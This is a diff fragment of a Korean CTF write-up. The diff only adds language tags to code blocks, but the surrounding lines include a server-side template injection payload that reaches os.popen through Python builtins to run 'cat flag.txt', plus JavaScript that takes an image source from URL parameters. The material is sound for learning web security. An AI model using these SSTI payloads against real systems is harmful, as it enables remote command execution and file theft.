@@ -464,7 +464,7 @@ print("[+] FLAG : ", flag)
 위 코드에서 `user.image_url`이 설정된 경우 이를 기본 이미지 URL로 사용합니다.
 
 다음 JavaScript 코드에서 이미지 소스를 결정합니다.
-```
+```js
 // profile.js
 const imageDisplay = document.getElementById('imageDisplay');
 const urlSearch = new URLSearchParams(location.search);
@@ -525,7 +525,7 @@ app.listen(PORT, () => { });
 
 2. SSTI
 
-```
+```py
 ssti={user.hash_password.__doc__[13]}{user.hash_password.__doc__[13]}7*7{user.hash_password.__doc__[30]}{user.hash_password.__doc__[30]}
 ```
 
@@ -540,6 +540,6 @@ def hash_password(password):
 
 **doc**로 들어가게 되어서 로직상 아래와 같이 SSTI를 일으킬 수 있습니다.
 
-```
+```py
 ssti={user.hash_password.__doc__[13]}{user.hash_password.__doc__[13]}request.application.__globals__.__builtins__.__import__(%27os%27).popen(%27cat%20flag.txt%27).read(){user.hash_password.__doc__[30]}{user.hash_password.__doc__[30]}
 ```
